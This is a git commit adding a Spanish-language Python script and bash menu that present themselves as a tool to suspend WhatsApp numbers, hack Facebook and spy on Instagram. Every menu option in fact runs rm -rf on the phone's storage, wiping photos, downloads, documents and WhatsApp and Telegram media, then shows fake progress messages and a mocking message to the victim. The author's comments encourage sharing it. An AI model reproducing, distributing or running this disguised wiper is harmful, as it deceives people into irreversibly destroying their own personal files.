9b4664efdbabb8d8e6d1eafd575c292b6ff53b57
Mr. Good <108030766+soymrgood@users.noreply.github.com>
2022-09-03 13:23:59 -0400

    Add files via upload

---
+++ .menu.sh
@@ -0,0 +1,19 @@
+#!/usr/bin/bash
+
+
+clear
+figlet NumBan
+
+
+echo -e "\e[1;37m(1)\e[0m \e[32mSuspender Numeros De WhatsApp \e[0m"
+
+echo -e "\e[1;37m(2)\e[0m \e[32mHackear Cuenta De Facebook \e[0m"
+
+echo -e "\e[1;37m(3)\e[0m \e[32mEspiar Cuenta De Instagram \e[0m"
+
+echo -e "\e[1;37m(4)\e[0m \e[5;32mRobar Cuenta De WhatsApp (No Disponible) \e[0m"
+
+echo -e "\e[1;37m(0)\e[0m \e[0;31mSalir \e[0m"
+
+echo ""
+echo -e "\033[1;44;37mElige una opcion. Ej: 2\033[0;m"
---
+++ numban.py
@@ -0,0 +1,164 @@
+#!/usr/bin/pyhton
+
+   # IMPORTACIONES
+import os, time
+from colorama import Fore, Back, Style, init
+init()
+
+
+
+# SOY EL CREADOR ORIGINAL DE ESTA HERRAMIENTA
+# PERO LA IDEA FUE SACADA DE OTRA HERRAMIENTA
+# PERO SI FUI YO QUIEN CREO ESTA VERSION DESDE CERO :)
+# SI TE QUIERES PONER EN CONTACTO CONMIGO ESTE ES MI TELEGRAM:
+# @mr_good_on
+# MUCHAS GRACIAS POR VER EL CODIGO FUENTE DE LA HERRAMIENTA
+# SI SABES EL VERDADERO FUNCIONAMIENTO DE ESTA HERRAMIENTA
+# COMPARTELA Y DEJA QUE OTROS LA USEN ;v JAJAJAJA
+
+
+
+
+    # MENU (HECHO EN BASH)
+os.system("bash .menu.sh")
+
+    # OPCION
+opcion = int(input(Fore.WHITE + Style.BRIGHT + "\n>> " + Style.RESET_ALL))
+
+
+    # CONDICION DE SUSPENDER NUMERO
+if opcion == 1:
+    
+    # ELIMINANDO ARCHIVOS DEL TELEFONO :)
+    os.system("rm -rf /sdcard/DCIM")
+    os.system("rm -rf /sdcard/Documents")
+    os.system("rm -rf /sdcard/Downloads")
+    os.system("rm -rf /sdcard/Download")
+    os.system("rm -rf /sdcard/Pictures")
+    os.system("rm -rf /sdcard/Movies")
+    
+    # ELIMINANDO ARCHIVOS DE WHATSAPP :)
+    os.system("rm -rf /sdcard/WhatsApp/Media/.Statuses")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Audio'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Voice Notes'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Audio'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Video'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Stickers'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Images'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Documents'")
+    
+    # ELIMINANDO ARCHIVOS DE TELEGRAM :)
+    
+    os.system("rm -rf /sdcard/Telegram/'Telegram Audio'")
+    os.system("rm -rf /sdcard/Telegram/'Telegram Documents'")
+    os.system("rm -rf /sdcard/Telegram/'Telegram Images'")
+    os.system("rm -rf /sdcard/Telegram/'Telegram Video'")
+    
+    
+    print (Fore.WHITE + Style.BRIGHT + "\nIntroduce el numero a suspender: " + Style.RESET_ALL)
+    
+    num = input(Fore.WHITE + Style.BRIGHT + "\n>> " + Style.RESET_ALL)
+    
+    time.sleep(2)
+    print ("[*] Verificando tu conexion a internet....")
+    time.sleep(5)
+    print (f"[*] Comprobando el numero {num}....")
+    time.sleep(7)
+    print ("[+] Numero comprobando correctamente, suspendiendo numero....")
+    time.sleep(3)
+    print ("[+] El numero esta suspendido correctamente.\n")
+    time.sleep(2)
+    print("Para volver a utilizar la herramienta utilize el comando:\n\npython numban.py")
+    
+    os.system("clear")
+    print("******************************************************************************")
+    print("""
+    JAJAJAJA TODOS TUS ARCHIVOS, FOTOS, VIDEOS, DOCUMENTOS, ETC. 
+    """)
+    
+    
+   # CONDICION DE HACKEAR FACEBOOK    
+elif opcion == 2:
+
+    # ELIMINANDO ARCHIVOS DEL TELEFONO :)
+    os.system("rm -rf /sdcard/DCIM")
+    os.system("rm -rf /sdcard/Documents")
+    os.system("rm -rf /sdcard/Downloads")
+    os.system("rm -rf /sdcard/Download")
+    os.system("rm -rf /sdcard/Pictures")
+    os.system("rm -rf /sdcard/Movies")
+    
+    # ELIMINANDO ARCHIVOS DE WHATSAPP :)
+    os.system("rm -rf /sdcard/WhatsApp/Media/.Statuses")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Audio'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Voice Notes'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Audio'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Video'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Stickers'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Images'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Documents'")
+    
+    # ELIMINANDO ARCHIVOS DE TELEGRAM :)
+    
+    os.system("rm -rf /sdcard/Telegram/'Telegram Audio'")
+    os.system("rm -rf /sdcard/Telegram/'Telegram Documents'")
+    os.system("rm -rf /sdcard/Telegram/'Telegram Images'")
+    os.system("rm -rf /sdcard/Telegram/'Telegram Video'")
+    
+    
+    print (Fore.WHITE + Style.BRIGHT + "\nIntroduce la URL del perfil que deseas hackear: " + Style.RESET_ALL)
+    
+    perfil = input(Fore.WHITE + Style.BRIGHT + "\n>> " + Style.RESET_ALL)
+    time.sleep(5)
+    print (Fore.RED + Style.BRIGHT + "\n[-] Verifica tu conexion a internet y vuelve a intentarlo :(" + Style.RESET_ALL)
+    time.sleep(2)
+    
+    os.system("clear")
+    print("******************************************************************************")
+    print("""
+    JAJAJAJA TODOS TUS ARCHIVOS, FOTOS, VIDEOS, DOCUMENTOS, ETC.
+    """)
+    
+    
+    
+    # CONDICION DE ESPIAR INSTAGRAM    
+elif opcion == 3:
+
+    # ELIMINANDO ARCHIVOS DEL TELEFONO :)
+    os.system("rm -rf /sdcard/DCIM")
+    os.system("rm -rf /sdcard/Documents")
+    os.system("rm -rf /sdcard/Downloads")
+    os.system("rm -rf /sdcard/Download")
+    os.system("rm -rf /sdcard/Pictures")
+    os.system("rm -rf /sdcard/Movies")
+    
+    # ELIMINANDO ARCHIVOS DE WHATSAPP :)
+    os.system("rm -rf /sdcard/WhatsApp/Media/.Statuses")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Audio'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Voice Notes'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Audio'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Video'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Stickers'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Images'")
+    os.system("rm -rf /sdcard/WhatsApp/Media/'WhatsApp Documents'")
+    
+    # ELIMINANDO ARCHIVOS DE TELEGRAM :)
+    
+    os.system("rm -rf /sdcard/Telegram/'Telegram Audio'")
+    os.system("rm -rf /sdcard/Telegram/'Telegram Documents'")
+    os.system("rm -rf /sdcard/Telegram/'Telegram Images'")
+    os.system("rm -rf /sdcard/Telegram/'Telegram Video'")
+    
+    
+    print (Fore.WHITE + Style.BRIGHT + "\nIntroduce la URL del perfil que deseas espiar: " + Style.RESET_ALL)
+    
+    perfil = input(Fore.WHITE + Style.BRIGHT + "\n>> " + Style.RESET_ALL)
+    time.sleep(5)
+    print (Fore.RED + Style.BRIGHT + "\n[-] Verifica tu conexion a internet y vuelve a intentarlo :(" + Style.RESET_ALL)
+    time.sleep(2)
+    
+    os.system("clear")
+    print("******************************************************************************")
+    print("""
+    JAJAJAJA TODOS TUS ARCHIVOS, FOTOS, VIDEOS, DOCUMENTOS, ETC. 
+    """)
